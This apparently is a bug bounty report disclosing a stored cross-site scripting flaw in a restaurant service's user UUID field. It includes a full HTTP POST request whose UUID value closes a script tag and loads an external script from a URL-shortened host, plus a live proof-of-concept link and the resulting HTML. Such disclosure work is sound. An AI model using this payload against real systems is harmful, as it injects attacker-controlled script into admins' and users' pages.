  "vulnerability_information": "I found an interesting bug where the system allows a user to create their own UUIDs. There are character length restrictions on this action, however it's not bound to a specific set of characters. Even so, I was able to include an external script that I URL shortened to just hit the character limit exactly. I was lucky I didn't need to add the closing script tag, because the one at the end of the line takes care of it. I wanted to get a full PoC rather than an `alert(1)`, because I think it could have been argued that the space was too small to actually do anything meaningful with.\n\nThis attack is similar in the way to #246806, except I'm quite confident this will be executed on admin panels and anywhere else a UUID is displayed, since sanitization on that attribute is highly unlikely.\n\n**PoC**\nJust replace the email with the one you own, and click the email confirmation link.\n```\nPOST /c/user HTTP/1.1\nHost: app.upserve.com\nAccept: application/json\nAccept-Language: en-US,en;q=0.5\nX-Requested-With: XMLHttpRequest\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nReferer: https://app.upserve.com/settings/account\nContent-Length: 134\nContent-Type: text/plain;charset=UTF-8\nDNT: 1\nConnection: close\n\nuuid=</script><script src=//is.gd/z0i2sU>&email=[YOUR EMAIL]&brand_pretty_url=ace-wasabis-rock-n-roll-sushi\n```\n\n**Live PoC**\nVisit the following page: https://app.upserve.com/b/ace-wasabis-rock-n-roll-sushi?email_token=2aa7296c678e11e7ab2f0242ac110002\n\nThe generated HTML looks like:\n`YUI.namespace('Env.DATA').consumer = {\"uuid\":\"</script><script src=//is.gd/z0i2sU>\",\"firstName\":null,`\n\nThanks,\n-- Tanner",
